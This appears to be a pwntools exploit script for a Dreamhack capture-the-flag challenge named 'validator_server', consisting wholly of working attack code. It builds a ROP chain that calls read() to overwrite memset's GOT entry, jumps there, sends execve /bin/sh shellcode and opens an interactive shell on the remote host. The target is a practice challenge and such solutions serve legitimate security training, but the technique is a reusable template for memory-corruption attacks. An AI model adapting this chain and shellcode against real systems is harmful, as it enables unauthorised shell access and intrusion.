from pwn import *
context.log_level='debug'

host = 'host1.dreamhack.games'
port = 9026

p = remote(host,port)

elf = ELF('./validator_server')

shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'

memset_got = elf.got['memset']
read_symbols = elf.symbols['read']


rdi_pop = 0x00000000004006f3
rsi_r15_pop = 0x00000000004006f1
rdx_pop = 0x000000000040057b

payload = b'DREAMHACK!'

lst = []
for i in range(0x76,0,-1):
    lst.append(i)

payload += bytearray(lst)

payload += p64(0) 
payload += p64(rdi_pop)
payload += p64(0)
payload += p64(rsi_r15_pop)
payload += p64(memset_got)
payload += p64(0)
payload += p64(rdx_pop)
payload += p64(0x50)
payload += p64(read_symbols)
 
payload += p64(memset_got)

p.sendline(payload)
p.sendline(shellcode)

p.interactive()
